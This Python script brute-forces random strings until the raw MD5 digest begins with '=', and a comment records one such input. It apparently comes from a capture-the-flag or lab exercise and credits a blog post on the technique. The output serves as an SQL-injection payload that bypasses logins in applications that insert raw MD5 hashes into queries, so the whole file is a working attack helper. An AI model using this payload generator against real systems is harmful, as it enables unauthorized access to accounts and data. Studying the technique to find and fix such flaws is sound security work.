import hashlib
import numpy as np
import string

# The string I found to produce the desired pattern below is: "RTLUUKfklNgAObfBBCgL"
# CREDIT I got the main idea from this blog post: https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes

desired_string = "'='"
valid_hash = None
valid_string = ""
letters = [l for l in string.ascii_letters]

# Basically brute forces the md5 algorithm creating random hashes until
# the beginning of the raw hash looks like '='

while valid_hash == None:
    random_string = ''.join(np.random.choice(letters) for i in range(0, 20))
    result = hashlib.md5(random_string.encode()).digest().decode("utf-8",errors='replace')
    if result.startswith("'='") and not result[3].isnumeric():
        valid_hash = result
        valid_string = random_string

print("The valid hash is: \"{}\"".format(valid_hash))
print("The valid string is: \"{}\"".format(valid_string))